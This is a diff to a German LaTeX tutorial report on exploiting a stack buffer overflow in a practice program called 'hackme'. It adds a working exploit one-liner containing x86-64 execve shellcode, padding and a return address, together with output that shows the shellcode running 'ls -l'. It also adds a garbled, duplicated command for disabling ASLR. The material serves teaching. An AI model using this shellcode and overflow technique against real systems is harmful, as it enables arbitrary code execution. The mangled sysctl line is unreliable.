@@ -843,7 +843,7 @@ Es gibt dabei verschiedene Stufen von ASLR, nämlich 0 (aus) , 1 und 2 (vollstä
 Um ASLR nun auf dem System temporär auszuschalten kann folgender Kommandozeilenbefehl verwendet werden, der die Zahl 0 in die genannte Datei schreibt.
 
 \begin{lstlisting}
->> echo 0 > /proc/sys/kernel/randomize_va_space
+>> sudo sysctl -w kernel.randomize_va_space= sudo sysctl -w kernel.randomize_va_space=00 
 \end{lstlisting}
 Das Programm hackme kommt einem bei der Suche nach der richtigen Sprungadresse sogar noch zuvor, indem es die Adresse der Startadresse des Buffers beim Ausführen mit angibt. Andernfalls kann man auch GDB nutzen um eine geeignete Adresse zu erhalten.
 \newline
@@ -878,9 +878,41 @@ Im zweiten Beispiel ist ASLR augeschaltet. Hier werden bei jedem Aufruf die selb
 \subsubsection{Den Shellcode ausführen}
 % *****************************************************************
 Nun wird es Zeit, die Theorie in die Praxis umzusetzen und erst einmal ohne Skript den Shellcode über hackme auszuführen. Dafür wird folgender Pyhton Befehl auf der Kommandozeile ausgeführt und danach durch Command Substitution, hackme als Argument übergeben.
-\begin{lstlisting}
+\newline
+\textbf{Aufgrund eines bisher nicht nachvollziehbaren Fehlers, wurde der Ansatz gewechselt und auf einen NOP Sled verzichtet. Stattdessen wird der benötigte Platz mit einer Folge von beliebigen Zeichen aufgefüllt, um die Rücksprungadresse überschreiben zu können}.
+\newline
 
+\begin{lstlisting}
+./hackme "$(python -c 'print "\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69
+\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66\x68
+\x2d\x63\x54\x5b\x48\x31\xc9\x51\xeb\x11\x5a\x52\x80\x72\x05\x41\x53
+\x57\x54\x5e\x48\x31\xd2\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x6c\x73
+\x20\x2d\x6c\x41AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\xdd\xff\xff\xff\x7f"')"
+Anfang von buffer: 0x7fffffffdd50
+Inhalt von buffer: H1�QH��/bin/shH�QT_H1�Qfh-cT[H1�Q�ZR�rASWT^H1Ұ;�����ls 
+-lAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAP����
+total 72
+-rwxrwxr-x 1 tux tux   489 Jan  5 11:45 convert.py
+-rwxrwxr-x 1 tux tux    90 Jan  5 10:48 ding.sh
+-rwxrwxr-x 1 tux tux   848 Jan  5 10:20 exec
+-rw-rw-r-- 1 tux tux   754 Jan  5 11:22 exec.asm
+-rw-rw-r-- 1 tux tux    65 Jan  5 10:22 exec.bin
+-rw-rw-r-- 1 tux tux   736 Jan  5 10:20 exec.o
+...
 \end{lstlisting}
+
+Hier wird der Python Kommandozeilen-Interpreter genutzt, der durch das -c Flag eingeschaltet wird. Dieser führt den Code, der im nachfolgendem String steht aus. Hierbei wird der Shellcode selber plus ein Padding aus 'A's sowie der gewünschten Rücksprungadresse auf der Kommandozeile ausgegeben. Der Python Aufruf ist dabei selber wieder mit "\$()" umgeben. Dabei handelt es sich um sogenannte Command Substitution. Dabei wird der in den Klammer stehende Befehl ausgeführt und das Ergebnis an der jeweiligen Stelle eingefügt. Somit kann die Payload an hackme übergeben und somit der gewünschte Shellcode ausgeführt werden. 
+
+% *****************************************************************
+\subsubsection{Das Script}
+% *****************************************************************
+Die erlangten Erkenntnisse wurden im Skript \texttt{hack.py} zusammengeführt.
+
+
 
 \end{document}
 
